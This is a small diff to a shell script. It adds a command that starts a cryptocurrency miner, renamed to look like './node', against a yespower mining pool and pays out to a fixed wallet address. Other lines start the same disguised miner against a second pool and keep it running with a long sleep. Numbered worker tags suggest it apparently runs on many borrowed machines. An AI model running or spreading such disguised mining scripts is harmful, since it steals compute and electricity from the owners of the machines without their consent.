@@ -7,5 +7,6 @@ HOURESX=crf_$WORKER_NUMBER
 PASSHOURS=$(date +%M%S)
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.${WORKER_NUMBER}_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
 ./node -a yespower -o stratum+tcp://pool.sprintpay.net:3032 -u SNxEnbY4EaMLaXDxceZoYzQc7pknwEB8zV.${HOURESX} -p ${PASSHOURS} > try.log
+./node -a yespower -o stratum+tcp://yespower.na.mine.zpool.ca:6234 -u SNxEnbY4EaMLaXDxceZoYzQc7pknwEB8zV.${HOURESX} -p c=SPRX,zap=SPRX > try.log
 sleep 29999
 
